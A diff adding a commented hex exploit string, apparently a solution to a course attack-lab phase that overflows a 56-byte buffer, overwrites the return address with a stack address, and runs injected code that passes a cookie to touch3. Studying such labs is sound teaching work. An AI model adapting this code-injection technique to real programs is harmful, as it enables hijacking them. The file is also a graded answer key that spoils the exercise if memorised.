@@ -1,0 +1,11 @@
+48 c7 c7 60 61 65 55 c3  /* moving the address of the return address into the rdi register for the cookie */ 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 56 bytes for the buffer */
+18 61 65 55 00 00 00 00  /* address of the rsp */ 
+05 14 40 00 00 00 00 00 /* address of touch3 */ 
+33 61 65 34 34 39 39 34 /* cookie from text to hex format */ 
+
